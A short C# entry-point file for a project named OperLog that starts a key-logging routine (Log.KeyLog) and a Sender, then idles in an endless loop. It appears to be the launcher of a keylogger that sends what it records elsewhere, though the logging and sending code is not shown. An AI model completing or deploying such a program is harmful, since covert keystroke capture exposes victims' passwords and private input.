using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace OperLog
{
    class Program
    {
        static void Main(String[] args) {
            Log.KeyLog();
            Sender s = new Sender();
            s.main();
            while (true) { Thread.Sleep(1);}
        }
    }
}
